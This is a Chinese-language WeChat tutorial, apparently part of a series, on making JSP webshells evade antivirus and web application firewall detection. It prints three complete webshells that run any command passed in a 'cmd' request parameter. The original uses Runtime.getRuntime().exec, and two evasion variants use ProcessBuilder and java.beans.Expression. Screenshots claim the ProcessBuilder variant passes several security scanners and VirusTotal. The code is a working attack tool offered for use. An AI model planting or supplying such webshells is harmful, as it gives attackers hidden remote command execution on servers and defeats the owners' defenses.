<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/BlfQ0t9s0vpTZo6sndfteg)

内置函数免杀
======

原始 webshell
-----------

```
<%@ page import="java.io.InputStream" %><%@ page import="java.io.BufferedReader" %><%@ page import="java.io.InputStreamReader" %><%@page language="java" pageEncoding="utf-8" %><%    String cmd = request.getParameter("cmd");    Process process = Runtime.getRuntime().exec(cmd);    InputStream is = process.getInputStream();    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));    String r = null;    while((r = bufferedReader.readLine())!=null){        response.getWriter().println(r);    }%>
```

查杀的点在于 Runtime.getRuntime().exec 非常明显的特征

利用 ProcessBuilder 替换 Runtime.getRuntime().exec(cmd)
---------------------------------------------------

Runtime.getRuntime().exec(cmd) 其实最终调用的是 ProcessBuilder 这个函数，因此我们可以直接利用 ProcessBuilder 来替换 Runtime.getRuntime().exec(cmd)，从而绕过正则表达式

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrwptKdeyEz3ibKQCODuwgtC1kvWRbiawLKnfNHrcnoYNjrtEBDHrtPyXw/640?wx_fmt=png)

```
<%@ page import="java.io.InputStream" %><%@ page import="java.io.BufferedReader" %><%@ page import="java.io.InputStreamReader" %><%@page language="java" pageEncoding="utf-8" %><%  String cmd = request.getParameter("cmd");  Process process = new ProcessBuilder(new String[]{cmd}).start();  InputStream is = process.getInputStream();  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));  String r = null;  while((r = bufferedReader.readLine())!=null){    response.getWriter().println(r);  }%>
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4Jr88417X486bvjhQSeEFVY0IAtuDMfuyblXvKibhacflBrep33shUIiamA/640?wx_fmt=png)

免杀效果

某狗:

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrYQ8I5RHrKFs4PAVkouITrzO72z7WoyAZDyJnrL4RqFZ010XOTU8ntA/640?wx_fmt=png)

某盾:

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JryK9rcJRJjXlkE5trV1e2jtv1THwicUcbTdhULfCTIibLkhibHKUhDZ9xw/640?wx_fmt=png)

某马：

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrA2ibOCbdnLdibSsxicjFYMoh4cKc2WFUTzViczXicaTThWmoia9wdrc5PF8A/640?wx_fmt=png)

vt：

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrEfZduN5D1AOEXfnjOcuFNoQSsg8KjyiaolcxfD3blPcaN0tgWlXD7VQ/640?wx_fmt=png)

某度在线查杀:

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrZRWqOxGr8UhAJuYKjR9aXNjNL3ozLBbMye9BXO6f8vEpOhz5licO0Kw/640?wx_fmt=png)

可以看到这全部都免杀过了，就换了一个函数。

BeansExpression 免杀
------------------

这种方式是利用 Expression 将 Runtime.getRuntime().exec 这个特征分开，相当于一个对调函数。免杀效果一般，因为很多查杀都是直接匹配 Runtime.getRuntime()

```
<%@ page import="java.beans.Expression" %><%@ page import="java.io.InputStreamReader" %><%@ page import="java.io.BufferedReader" %><%@ page import="java.io.InputStream" %><%@ page language="java" pageEncoding="UTF-8" %><%  String cmd = request.getParameter("cmd");  Expression expr = new Expression(Runtime.getRuntime(), "exec", new Object[]{cmd});  Process process = (Process) expr.getValue();  InputStream in = process.getInputStream();  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));  String tmp = null;  while((tmp = bufferedReader.readLine())!=null){    response.getWriter().println(tmp);  }%>
```

查杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrPc2K0SLRgibJccM7gXAffF5gsFpgTSDghRuZV9sxnkvlPYF122eiciaww/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrCs8BIyBxDv94dtRsFwaW3eQasIx2ow5FsqxXLCfNbwqI7icrpSJJtmA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v7Xkb1F9aIgNKwh00ayC4JrhWFzgRpzLrb3pDKKl5QUksXZ3tjA1vl7ibUibjnwYdO8HdATMk7ibMj7w/640?wx_fmt=png)

可以看到某狗已经查杀出来了。只能说效果很一般

总结
--

在此章节中主要讲解一下内置的一些函数来替换，从而消除一些特征，但这种方式还是非常非常容易被查杀的，后面会讲解 jsp 的一些特性，字节码，反射，包含等免杀方式

加下方 wx，拉你一起进群学习

![](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v4WZgYJeibL4XoXol2MibfTeNPUTuUmqkgMFFf3icptn2CEN5kJEOOPWMg7STl235fSLQMgQ8GuSmWSg/640?wx_fmt=jpeg)

往期推荐

[

net 反射



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247502154&idx=1&sn=9d0ef9765a8502ad8cd08d9628d7fbce&chksm=ce6773f6f910fae0743a2fd4dcff6d4e13bba1ee8472e710cb80a089f3dac787e9d174023ed7&scene=21#wechat_redirect)

[

firefox 批量 get password



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247502008&idx=1&sn=5036a51f3dfc3b2c2b42c1786ae16dc6&chksm=ce677204f910fb128fb0507f2f67fd17c0ed69418b71a59268043f4ee1afcabec088b9dee3ed&scene=21#wechat_redirect)

[

Demo 版菜刀



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247501693&idx=1&sn=418ba0866f99fa7e03e402444c9ad15d&chksm=ce677dc1f910f4d7fb73c5e079ed60b6c7967c7b9ec1d03d04e133d8ac384b6f9524f0614d4c&scene=21#wechat_redirect)

[

tomcat 原理刨析之手写 tomcat



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247501070&idx=1&sn=1d0036241200590d3bda901f0607fdfa&chksm=ce677fb2f910f6a4f0e01452d9aad1a7336b463c5114848c41f2a74188d2e34f3a84ca93023d&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（四）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247501017&idx=1&sn=aa602658159907822f7c59c85c427576&chksm=ce677e65f910f773422d910e57e8fa4cb2f0278b88319945839cd8f3a2262c6dc264e7767dcd&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（三）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500845&idx=1&sn=73e9a559ce1c1d48b6895d87cfcda078&chksm=ce677e91f910f787c4c8c403dfb3e23027bb379e47053a1b3f489d8487d86b75f7dd6286fa05&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（二）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247499857&idx=1&sn=b49ca696334f2161e7311ad625ee84c6&chksm=ce677aedf910f3fb0fa061a7d3b403980dfccb2fc59acf0aec87bb722b90c6715241448cb86c&scene=21#wechat_redirect)

[

什么？你还不会 webshell 免杀？（一）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247498204&idx=1&sn=6d1196d195193296ac413bc64e5a71c4&chksm=ce674360f910ca763cb59c834b63e7bc010a7020ba4ef06c5be05d0b8f0dbc78b6dd485b451a&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibZ6uZjjH3v7LQZwTb4qED3KvozKicnJd9ejpVoCntCRqf53IiaK2T3myzcUn5sswkUPfpQj1KHAALFcMFNYjfriaw/640?wx_fmt=gif)